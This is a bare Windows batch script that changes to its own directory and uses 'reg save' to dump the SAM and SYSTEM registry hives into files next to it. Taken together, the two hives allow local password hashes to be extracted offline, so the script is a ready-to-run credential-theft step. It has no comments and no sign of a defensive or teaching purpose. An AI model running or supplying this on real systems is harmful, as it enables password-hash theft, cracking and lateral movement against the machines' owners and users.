@setlocal enableextensions
@cd /d "%~dp0"
reg save HKLM\sam sam.save
reg save HKLM\system system.save
exit /b
